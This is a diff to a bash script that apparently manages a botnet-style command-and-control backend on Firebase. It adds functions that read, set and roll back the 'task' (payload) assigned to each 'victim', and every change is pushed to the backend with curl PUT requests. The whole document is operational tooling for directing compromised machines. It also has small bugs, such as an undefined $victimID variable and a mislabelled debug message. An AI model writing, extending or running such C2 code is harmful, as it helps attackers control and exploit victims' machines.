@@ -38,6 +38,15 @@ function getTaskID(){
 
 }
 
+function getPreviousTaskID(){
+  echo "getTaskID: $1" >&2
+  local victimID="$1"
+
+  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victimID/previousTask.json" \
+   | tr -d '"'
+
+}
+
 function getTaskURL() {
   local payloadID="$1"
   curl -s "https://${firebaseProject}.firebaseio.com/tasks/$payloadID.json" \
@@ -45,20 +54,37 @@ function getTaskURL() {
 }
 
 function setVictimTask() {
+  # Set task of victim $1 to task $2.
+  # If $2 == '_previous_task_', then use the victims previous task as the 
   local victim="$1"
   local taskID="$2"
+  local currentTaskID=`getTaskID "$victim"`
 
   if [ -z "$1" ] || [ -z "$2" ]; then
     usage
     exit 1
   fi
 
+  if [ "$taskID" == "$currentTaskID" ]; then
+    # The current task is the same as the next task. Do not change
+    return
+  elif [ "$taskID" == "_previous_task_" ]; then
+    taskID=`getPreviousTaskID "$victimID"`
+  fi
+
+  # Set the next task, but only if it works!
   local taskURL="`getTaskURL $taskID`"
-  if [  "$taskURL" == "null" ]; then
+  if [ "$taskURL" == "null" ]; then
+    # This task is unknown to us. Change to the default task instead.
+    # Make sure that this task is registered!
     curl -X PUT -d "\"default\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
   else
     curl -X PUT -d "\"$taskID\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
   fi
+
+  # Set previous task
+  curl -X PUT -d "\"$currentTaskID\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/previousTask.json" &>/dev/null
+  
 }
 
 function getIterationLength() {
